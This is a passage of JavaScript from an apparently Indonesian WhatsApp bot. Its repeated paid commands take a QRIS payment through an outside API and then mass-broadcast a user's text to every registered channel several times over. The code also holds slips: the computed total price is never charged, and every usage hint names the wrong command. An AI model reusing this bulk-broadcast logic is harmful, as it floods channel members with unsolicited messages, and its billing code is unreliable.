Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch4x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 12000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch5x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 15000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch6x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 18000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch7x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 21000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch8x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 24000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch9x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 27000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

            for (let i = 0; i < jumlah; i++) {
                const prosesPengiriman = global.channels.map(async (id) => {
                    try {
                        await dwiaff.sendMessage(id, { text: teks }, { quoted: msgQr });
                        totalBerhasil += 1;
                    } catch (error) {
                        console.error(`❌ Gagal mengirim ke ${id}:`, error);
                        totalGagal += 1;
                    }
                });

                // Tunggu semua pengiriman selesai di iterasi ini
                await Promise.all(prosesPengiriman);
                if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
            }

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: `🎯 Pesan berhasil dikirim ke semua saluran. 🎉` }, { quoted: db.users[m.sender].deposit.msg });
            m.reply(`🚀 *Berhasil mengirim total ${totalBerhasil} pesan* ke semua saluran!`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasajpmch10x": {
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jasajpmch1x jumlah|jeda|teks`\n\n💡 *Contoh:* `jasajpmch1x 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    // Mengambil saluran yang terdaftar
    global.channels = loadChannels();

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    // Proses Pembayaran (QRIS)
    const hargaPerPesan = 30000;
    const totalHarga = jumlah * hargaPerPesan; // Harga total sebelum pajak

     const amount = Number(hargaPerPesan) + generateRandomNumber(110, 250);

    const UrlQr = global.qrisOrderKuota;
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
🎉 *▧ INFORMASI PEMBAYARAN ▧ 🎉

*• ID Transaksi :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Layanan :* JPMCH 🚀
*• Expired :* 5 menit ⏳

✨ *Note :* ✨
QRIS pembayaran hanya berlaku selama 5 menit. 
Setelah pembayaran selesai, pengiriman pesan akan dimulai otomatis. 🔥
    `;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "❌ QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000); // 5 menit expired
        }
    };

    await db.users[m.sender].deposit.exp();

    // Cek status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Pengiriman pesan setelah konfirmasi pembayaran
            m.reply(`✅ *Pembayaran berhasil!* Pesan akan dikirim ke ${jumlah} saluran. 📡`);

